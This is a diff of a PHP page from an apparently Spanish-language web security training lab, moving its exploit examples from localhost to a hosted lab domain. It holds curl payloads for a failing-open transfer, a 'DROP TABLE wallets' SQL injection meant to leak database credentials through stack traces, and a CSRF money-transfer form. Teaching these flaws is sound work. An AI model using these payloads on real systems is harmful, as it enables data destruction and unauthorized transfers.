@@ -38,13 +38,13 @@ $labInfo = [
         </ol>
         <p class="mb-0"><small>CSRF es historico (fuera del Top 10) pero pedagogicamente relevante.</small></p>
     ',
-    'exploit' => '# 1. Failing open - enviar user_id invalido
-curl -X POST http://localhost:8082/a10_pagos/transferir.php \\
+    'exploit' => '# 1. Failing open - enviar user_id invalido contra la VPS
+curl -X POST https://nexolab.guajilodev.com/a10_pagos/transferir.php \\
   -d "to_user=999&amount=100"
 # Responde "success" aunque el usuario no exista
 
 # 2. Stack trace - provocar error de SQL
-curl -X POST http://localhost:8082/a10_pagos/transferir.php \\
+curl -X POST https://nexolab.guajilodev.com/a10_pagos/transferir.php \\
   -d "to_user=\'; DROP TABLE wallets--&amount=100"
 # El stack trace muestra credenciales de la BD
 
@@ -282,13 +282,12 @@ include __DIR__ . '/../shared/header.php';
                     
                     <h6>2. Stack Trace:</h6>
                     <pre class="bg-light p-2"><code>curl -X POST \
-  localhost:8082/a10_pagos/transferir.php \
+  https://nexolab.guajilodev.com/a10_pagos/transferir.php \
   -d "to_user='; DROP--&amount=100"</code></pre>
                     
                     <h6>3. CSRF:</h6>
                     <p class="mb-1">Crea un HTML con este form y abrilo:</p>
-                    <pre class="bg-light p-2"><code>&lt;form action="http://localhost:8082
-  /a10_pagos/transferir.php" 
+                    <pre class="bg-light p-2"><code>&lt;form action="https://nexolab.guajilodev.com/a10_pagos/transferir.php" 
   method="POST"&gt;
   &lt;input name="to_user" value="1"&gt;
   &lt;input name="amount" value="100"&gt;
